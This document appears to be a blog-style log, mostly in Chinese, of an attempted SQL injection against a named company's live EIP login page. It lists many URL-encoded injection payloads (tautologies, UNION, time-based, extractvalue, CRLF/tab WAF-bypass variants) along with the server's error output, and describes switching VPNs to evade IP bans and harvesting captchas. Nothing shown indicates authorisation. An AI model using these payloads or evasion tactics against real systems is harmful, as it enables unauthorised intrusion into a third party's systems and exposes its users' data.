---
title: SQL Injection eip-nextop Failed
description: SQL Injection eip-nextop Failed
last_update:
  date: "2025-08-20T08:00:00+08:00"
---

## 觀察

- 目標網址 `https://www.eip.nextop.com.tw/homepage/login.php`
- 目標 querystring `?username=1&password=2&chkcode=8647`
- WAF 蠻嚴格的，403 大概 3-5 次就會被鎖 IP，需要大量切換 VPN
- 驗證碼可以從 `https://www.eip.nextop.com.tw/` 提取
- 驗證碼大概 5-10 分鐘會過期
- 驗證碼是跟 `Cookie: PHPSESSID=3e9d9b7261b10eaeab1610c7be13c995` 綁定的
- 可輸入 URL Encoded Value，PHP 在拼接 SQL 字串時，會自動先 URL Decode
- 推測原始的 SQL 語法是

```sql
-- SELECT 查詢 (login.php:19)
SELECT * FROM [emp_table] WHERE emp_id = '[username]' AND emp_pwd = '[password]' AND emp_online = 1

-- INSERT 查詢 (login.php:30)
INSERT INTO log VALUES ('[username]', '[password]', '1.1.1.1', '登入失敗', '2025-08-20 13:44:33')
```

## 測試過程

1. `?username=%27&password=%27&chkcode=3134`

```
Fatal error: Uncaught PDOException: SQLSTATE[21S01]: Insert value list does not match column list: 1136 Column count doesn't match value count at row 1 in /home/nextop/public_html/hosts/eip/include/class/PDO.php:291 Stack trace: #0 /home/nextop/public_html/hosts/eip/include/class/PDO.php(291): PDOStatement->execute() #1 /home/nextop/public_html/hosts/eip/include/class/PDO.php(70): DB->_Query('INSERT INTO log...') #2 /home/nextop/public_html/hosts/eip/include/class/PDO.php(84): DB->Execute('INSERT INTO log...') #3 /home/nextop/public_html/hosts/eip/homepage/login.php(30): DB->Insert('log', Array) #4 {main} thrown in /home/nextop/public_html/hosts/eip/include/class/PDO.php on line 291
```

2. `?username=';&password=password&chkcode=8647`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ';','password','138.199.21.204','登入失敗','2025-08-20 14:25:35')' at line 1 in /home/nextop/public_html/hosts/eip/include/class/PDO.php:291 Stack trace: #0 /home/nextop/public_html/hosts/eip/include/class/PDO.php(291): PDOStatement->execute() #1 /home/nextop/public_html/hosts/eip/include/class/PDO.php(70): DB->_Query('INSERT INTO log...') #2 /home/nextop/public_html/hosts/eip/include/class/PDO.php(84): DB->Execute('INSERT INTO log...') #3 /home/nextop/public_html/hosts/eip/homepage/login.php(30): DB->Insert('log', Array) #4 {main} thrown in /home/nextop/public_html/hosts/eip/include/class/PDO.php on line 291
```

3. `?username=admin%27)%3b--%20&password=x&chkcode=3134`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ');-- ' and emp_pwd = 'x' and emp_online = 1' at line 1 in /home/nextop/public_html/hosts/eip/include/class/PDO.php:45 Stack trace: #0 /home/nextop/public_html/hosts/eip/include/class/PDO.php(45): PDOStatement->execute() #1 /home/nextop/public_html/hosts/eip/homepage/login.php(19): DB->GetRow('select * from p...') #2 {main} thrown in /home/nextop/public_html/hosts/eip/include/class/PDO.php on line 45
```

4. Forbidden Payloads

- `?username=admin%27%20or%201%3d1%23&password=x&chkcode=3134`
- `?username=admin%27%20or%20%27a%27%3d%27a%27%23&password=x&chkcode=3134`
- `?username=admin%27%20or%20sleep(0)%3d0%23&password=x&chkcode=3134`
- `?username=admin%27%20and%20%27x%27%3d%27y%27%20union%20select%201,2,3%23&password=x&chkcode=3134`
- `?username=admin%27%20union%20all%20select%20null,null,null%23&password=x&chkcode=3134`
- `?username=admin%27%20or%20length(%27a%27)%3d1--%20&password=x&chkcode=3134`
- `?username=admin%27%20or%20%27%27%3d%27&password=%27%20or%20%27%27%3d%27&chkcode=3134`
- `?username=admin%27%20div%200--%20&password=x&chkcode=3134`
- `?username=admin%27%20regexp%20%27.%27--%20&password=x&chkcode=3134`
- `?username=admin%27%20xor%20false--%20&password=x&chkcode=3134`
- `?username=admin%27%20between%20%27a%27%20and%20%27z%27--%20&password=x&chkcode=3134`
- `?username=admin%27)%2b(%270&password=0%27)%23&chkcode=3134`
- `?username=admin&password=x%27%2b%270&chkcode=3134`
- `?username=admin&password=x%00&chkcode=3134`
- `?username=admin%27%0d%0aunion%0d%0aselect%0d%0a1,2,3--%0d%0a&password=x&chkcode=9732`
- `?username=admin%27%0d%0aand%0d%0a1%3d2%0d%0a--%0d%0a&password=x&chkcode=9732`
- `?username=admin%27%0d%0aand%0d%0aextractvalue(1,concat(0x7e,version(),0x7e))%0d%0a%23&password=x&chkcode=1505`
- `?username=admin%27%0d%0a%09%09and%09%091%09%09like%09%091%09%09--%09&password=x&chkcode=1505`
- `?username=admin%27%0d%0a%09%09%2b%09%09%270%27%09%09--%09&password=x&chkcode=2409`

```
Forbidden
You don't have permission to access this resource.

Additionally, a 403 Forbidden error was encountered while trying to use an ErrorDocument to handle the request.
```

5. `?username=admin%27%3b%23&password=x&chkcode=3134`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ';#','x','185.107.56.222','登入失敗','2025-08-20 14:34:51')' at line 1 in /home/nextop/public_html/hosts/eip/include/class/PDO.php:291 Stack trace: #0 /home/nextop/public_html/hosts/eip/include/class/PDO.php(291): PDOStatement->execute() #1 /home/nextop/public_html/hosts/eip/include/class/PDO.php(70): DB->_Query('INSERT INTO log...') #2 /home/nextop/public_html/hosts/eip/include/class/PDO.php(84): DB->Execute('INSERT INTO log...') #3 /home/nextop/public_html/hosts/eip/homepage/login.php(30): DB->Insert('log', Array) #4 {main} thrown in /home/nextop/public_html/hosts/eip/include/class/PDO.php on line 291
```

6. `?username=admin%27%2c%27x%27%2c%27127.0.0.1%27%2c%27test%27%2c%27x%27)%3b%23&password=x&chkcode=3134`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''x','127.0.0.1','test','x');#' and emp_pwd = 'x' and emp_online = 1' at line 1 in /home/nextop/public_html/hosts/eip/include/class/PDO.php:45 Stack trace: #0 /home/nextop/public_html/hosts/eip/include/class/PDO.php(45): PDOStatement->execute() #1 /home/nextop/public_html/hosts/eip/homepage/login.php(19): DB->GetRow('select * from p...') #2 {main} thrown in /home/nextop/public_html/hosts/eip/include/class/PDO.php on line 45
```

7. 帳號/密碼 錯誤,請重新輸入.

`?username=admin%5c%27&password=x&chkcode=3134`
`?username=admin%09&password=x&chkcode=7652`
`?username=admin%0a&password=x&chkcode=9146`
`?username=admin%0d%0a&password=x&chkcode=9638`

8. `?username=admin&password=x&chkcode=3134%27`

```
驗證碼 錯誤,請重新輸入.
```

9. `?username=admin%27%0d%0a&password=x&chkcode=9732`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'x' and emp_online = 1' at line 2 in /home/nextop/public_html/hosts/eip/include/class/PDO.php:45 Stack trace: #0 /home/nextop/public_html/hosts/eip/include/class/PDO.php(45): PDOStatement->execute() #1 /home/nextop/public_html/hosts/eip/homepage/login.php(19): DB->GetRow('select * from p...') #2 {main} thrown in /home/nextop/public_html/hosts/eip/include/class/PDO.php on line 45
```

10. `?username=admin%27%0d%0a%23&password=x&chkcode=1505`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 2 in /home/nextop/public_html/hosts/eip/include/class/PDO.php:291 Stack trace: #0 /home/nextop/public_html/hosts/eip/include/class/PDO.php(291): PDOStatement->execute() #1 /home/nextop/public_html/hosts/eip/include/class/PDO.php(70): DB->_Query('INSERT INTO log...') #2 /home/nextop/public_html/hosts/eip/include/class/PDO.php(84): DB->Execute('INSERT INTO log...') #3 /home/nextop/public_html/hosts/eip/homepage/login.php(30): DB->Insert('log', Array) #4 {main} thrown in /home/nextop/public_html/hosts/eip/include/class/PDO.php on line 291
```

11. `?username=admin%27%0d%0a--%0d%0a&password=x&chkcode=1505`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'x' and emp_online = 1' at line 3 in /home/nextop/public_html/hosts/eip/include/class/PDO.php:45 Stack trace: #0 /home/nextop/public_html/hosts/eip/include/class/PDO.php(45): PDOStatement->execute() #1 /home/nextop/public_html/hosts/eip/homepage/login.php(19): DB->GetRow('select * from p...') #2 {main} thrown in /home/nextop/public_html/hosts/eip/include/class/PDO.php on line 45
```

12. `?username=admin%27%0d%0a%09%09--%09&password=x&chkcode=1505`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 2 in /home/nextop/public_html/hosts/eip/include/class/PDO.php:291 Stack trace: #0 /home/nextop/public_html/hosts/eip/include/class/PDO.php(291): PDOStatement->execute() #1 /home/nextop/public_html/hosts/eip/include/class/PDO.php(70): DB->_Query('INSERT INTO log...') #2 /home/nextop/public_html/hosts/eip/include/class/PDO.php(84): DB->Execute('INSERT INTO log...') #3 /home/nextop/public_html/hosts/eip/homepage/login.php(30): DB->Insert('log', Array) #4 {main} thrown in /home/nextop/public_html/hosts/eip/include/class/PDO.php on line 291
```
